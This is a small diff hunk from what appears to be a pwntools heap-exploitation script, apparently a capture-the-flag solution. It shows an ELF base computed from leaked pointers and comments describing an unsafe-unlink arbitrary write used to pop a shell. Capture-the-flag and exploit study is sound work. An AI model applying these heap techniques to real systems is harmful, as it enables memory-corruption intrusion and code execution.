@@ -84,7 +84,7 @@ leaks3 = read_chunk()
 elf_base_addr = (u64(leaks3[0x110:0x118])^((heap_base_addr+0x3b0)>>12)^((stack_argv_addr-0x48)>>12))-0x10b0
 log.info(f"elf base address: {hex(elf_base_addr)}")
 
-# Stage 4: unsafe unlink to arbitrary write to pop a shell
+# Stage 4: unsafe unlink to arbitrary write on elf to pop a shell
 # unsafe-unlink method is always used when there is a global variable in bss section storing a heap address
 # this technique can be used to change a global variable's value to its address minus 0x18, which is very useful in a heap challenge with limited write
 # clear unsorted bin
